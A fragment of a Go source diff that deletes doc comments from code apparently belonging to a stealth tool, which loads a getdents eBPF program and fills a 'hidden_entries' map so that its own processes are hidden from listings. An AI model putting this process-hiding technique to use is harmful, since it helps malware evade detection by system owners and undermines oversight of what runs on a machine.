@@ -30,7 +30,6 @@ type HiddenEntry struct {
 	IsPrefix uint8
 }
 
-// matchesBinary returns true if the process with pid matches the binary name
 func matchesBinary(pid int, binaryName string) bool {
 	exePath := fmt.Sprintf("/proc/%d/exe", pid)
 	target, err := os.Readlink(exePath)
@@ -42,7 +41,6 @@ func matchesBinary(pid int, binaryName string) bool {
 	return err == nil && strings.Contains(string(cmdlineBytes), binaryName)
 }
 
-// getYodaPIDs returns all PIDs of running processes whose executable matches the current binary name.
 func getYodaPIDs() ([]int, error) {
 	selfExe, err := os.Readlink("/proc/self/exe")
 	if err != nil {
@@ -69,7 +67,6 @@ func getYodaPIDs() ([]int, error) {
 	return pids, nil
 }
 
-// getBinaryName returns the basename of the current executable.
 func getBinaryName() (string, error) {
 	selfExe, err := os.Readlink("/proc/self/exe")
 	if err != nil {
@@ -78,7 +75,6 @@ func getBinaryName() (string, error) {
 	return filepath.Base(selfExe), nil
 }
 
-// loadGetdentsBPF loads the getdents.o eBPF object file and returns the collection.
 func loadGetdentsBPF() (*ebpf.Collection, error) {
 	spec, err := ebpf.LoadCollectionSpecFromReader(bytes.NewReader(getDentsObj))
 	if err != nil {
@@ -91,8 +87,6 @@ func loadGetdentsBPF() (*ebpf.Collection, error) {
 	return coll, nil
 }
 
-// populateHiddenEntries populates the hidden_entries map with the given PIDs as strings.
-// populateHiddenEntries ajoute les PIDs et le nom du binaire à la map hidden_entries.
 func populateHiddenEntries(hiddenMap *ebpf.Map, pids []int, binName string) error {
 	idx := 0
 
@@ -138,7 +132,6 @@ func populateHiddenEntries(hiddenMap *ebpf.Map, pids []int, binName string) erro
 	return nil
 }
 
-// HideOwnPIDs loads the BPF program and populates the hidden_entries map with this program's PIDs.
 func HideOwnPIDs(extraPIDs ...int) (enterLink, exitLink link.Link, err error) {
 	pids, err := getYodaPIDs()
 	if err != nil {
